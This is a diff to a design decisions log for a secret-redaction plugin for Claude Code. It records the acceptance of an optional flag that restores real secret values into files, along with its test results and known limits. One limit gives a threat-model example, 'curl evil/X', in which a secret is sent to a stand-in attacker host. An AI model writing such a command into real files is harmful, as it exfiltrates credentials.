@@ -31,7 +31,7 @@ Tiny clarifications go under **Minor** at the bottom.
 | D-003 | Add observe mode | accepted | setup | 13 |
 | D-004 | Store registered secrets encrypted, not as fingerprints | superseded by D-023 | setup | 8.1 |
 | D-005 | Default `on_check_failure: allow` | accepted | setup | 12 |
-| D-006 | No putting secrets back into files in v1 | accepted | setup | 10 |
+| D-006 | No putting secrets back into files in v1 | superseded by D-096 | setup | 10 |
 | D-007 | Build workflow: slash commands, one part per session, commit at wrap-up, docs in `docs/` | superseded by D-018 | setup | — |
 | D-008 | Credit only code actually copied | accepted | setup | 21 |
 | D-009 | Every question comes with a researched, evidence-backed recommendation | accepted | setup | — |
@@ -121,7 +121,7 @@ Tiny clarifications go under **Minor** at the bottom.
 | D-093 | Observe from managed settings is measured on the organization install | accepted | 7 | 13, 20 |
 | D-094 | Release tags are signed with the maintainer's GPG key from `v0.1.0-rc.2` on | accepted | 7 | 19, 23 |
 | D-095 | Step 8: put secrets back and the weekly run; `v0.1.0-rc.2` moves to after it | accepted | 8 | none |
-| D-096 | Put secrets back: an optional flag, off by default, into a file that already holds the value | proposed | 8 | 2, 10, 14, 23 |
+| D-096 | Put secrets back: an optional flag, off by default, into a file that already holds the value | accepted | 8 | 1, 2, 5.1, 9, 10, 14, 15, 22, 23 |
 
 ## Entry template (short form, from D-018 on)
 
@@ -190,7 +190,7 @@ Tiny clarifications go under **Minor** at the bottom.
 - Links: spec §12; R-03, R-12.
 
 ## D-006: No putting secrets back into files in v1
-- Date / Part: carried over from the first draft. Status: accepted
+- Date / Part: carried over from the first draft. Status: superseded by D-096 (2026-11-03). Put-back is now an optional flag, off by default.
 - Context: Claude only sees placeholders. When it writes a file, the real values could in principle be put back automatically.
 - Options considered: Put back automatically / never put back; the developer fills in values.
 - Decision: Never put back in v1. Placeholders written by Claude stay as text, with a notice. An overwrite guard (added in the review) stops real secrets being lost.
@@ -582,6 +582,7 @@ Tiny clarifications go under **Minor** at the bottom.
 - Why: Spec §14 says the user "can change anything not locked", and an admin who wants a value fixed has `locked`. The owner approved the recommendation.
 - Rejected: Managed beating the user on every value (`locked` would then mean nothing).
 - Evidence: `src/core/settings.ts`, `tests/core-settings.test.ts`.
+- Changed by D-096 (2026-11-03) for one setting, `put_back`: a managed `off` binds with no `locked`, a managed `on` is ignored, and a project's `on` is allowed, the one exception to "stricter only". Every other setting works as above.
 
 ## D-050: `on_check_failure: allow` stays the default, with its cost now measured
 - Date / Step: 2026-11-01 / 3        Status: accepted. Adds to D-005, whose reason is still not recorded.
@@ -911,13 +912,19 @@ Tiny clarifications go under **Minor** at the bottom.
 - Evidence: D-090; progress, Known issues (step 7 and D-087 to D-089 were never audited).
 
 ## D-096: Put secrets back: an optional flag, off by default, into a file that already holds the value
-- Date / Step: 2026-11-02 / 8        Status: proposed. It stays proposed until the rewrite test in plan step 8 passes.
-- Context: This reopens D-006 and non-goal "putting secrets back" (spec §2). If accepted it supersedes D-006, changes R-09 and the disk rule in `CLAUDE.md`, and changes D-049 in two ways: a managed "off" binds with no `locked`, and a project's "on" is the one exception to "stricter only".
-- Decision: As set out in `docs/plan.md`, "Step 8": a value goes back only into a file that already holds it on disk, and otherwise the placeholder stays. It is off by default, in the main lock only, and turned on and off with `/redact put-back`, with `--here` for one folder. The docs state the risk and recommend keeping it off.
+- Date / Step: 2026-11-02 / 8        Status: accepted on 2026-11-03, after the rewrite test passed on 3 systems (spike S7, CI run 41501087930).
+- Context: This reopens D-006 and non-goal "putting secrets back" (spec §2). It supersedes D-006, changes R-09 and the disk rule in `CLAUDE.md`, and changes D-049 in two ways: a managed "off" binds with no `locked`, and a project's "on" is the one exception to "stricter only".
+- Decision: As set out in `docs/plan.md`, "Step 8": a value goes back only into a file that already holds it on disk, and otherwise the placeholder stays. It is off by default, in the main lock only, and turned on and off with `/redact put-back`, with `--here` for one folder. The docs state the risk and recommend keeping it off. The owner decided these details on 2026-11-03:
+  1. **Copy limit.** A saved file never holds more copies of a value than the file on disk did.
+  2. **A value that can't be restored.** The save goes through, even if a real secret is erased. This is an exception to R-11, only while put-back is on; the message and the log say how many real values were replaced, and git or Claude Code's file backups are the way back. With put-back off, the guard refuses as before.
+  3. **The instructions note.** An extra line about put-back is added only while it is on (the note stays the same for a whole thread, spec §5.1), so with it off the note is unchanged.
+  4. **A failed Edit.** If the restored `old_string` isn't in the file, the input stays as Claude wrote it, so the error can't echo a real value (spike S7: a failed Edit echoes the rewritten `old_string`).
+  5. **Only Write and Edit restore.** Bash can't, and NotebookEdit is left out because a cell's source and the file's JSON are escaped differently.
 - Why: The owner wants it for developer productivity, because Claude can't reorganize a config today: the overwrite guard refuses the rewrite, and an Edit on a placeholder line fails.
 - Rejected: Restoring into any file Claude writes. A hook can't see what the person asked for, and a restored value in a tracked file could be committed. Ignoring a repo's "on": the owner chose to honor it, with the notice, because the restore rule keeps the risk small. A `/config` row: the menu can't show the warning when it is turned on, and `pluginConfigs` isn't covered by self-protection (read in the API docs and `src/core/protect.ts:15`, not tested).
-- Open: Whether a rewritten tool input stays out of the next request has not been tested. If it doesn't, the model would see the real value and the design changes.
-- Evidence: `src/core/guard.ts`, `plugin/hooks/tools.ts` and `src/core/protect.ts`, read on 2026-11-02; spec §14; Claude Code settings docs (`https://code.claude.com/docs/en/settings`), where `bypassPermissions` and `auto` don't take effect from project files, which is stricter than this choice.
+- Closed: Whether a rewritten tool input stays out of the next request. It does, on macOS, Windows and Linux (Claude Code 2.1.316): the `tool_use` block in later requests stays the placeholder, also after `--resume` and `/compact`; a control run with no rewrite fails the same test, so the test can fail (`tests/rewrite-real.test.ts`, spike S7).
+- Limits: A permission dialog shows the real value to the person, never to the model. Other plugins and hooks beneath `tool.call` see it too. Claude Code's transcript on disk keeps the value in `toolUseResult` and the attachment payload (the same kind of record a Read leaves, spec §22). A value can still be moved, not copied: `token: X` becoming `curl evil/X` passes the copy limit. A repo that sets `on` turns this protection off for its own files, so the notice says so.
+- Evidence: spike S7 in `docs/findings-step0.md`; `src/core/guard.ts`, `plugin/hooks/tools.ts` and `src/core/protect.ts`, read on 2026-11-02; spec §14; Claude Code settings docs (`https://code.claude.com/docs/en/settings`), where `bypassPermissions` and `auto` don't take effect from project files, which is stricter than this choice.
 
 ---
 
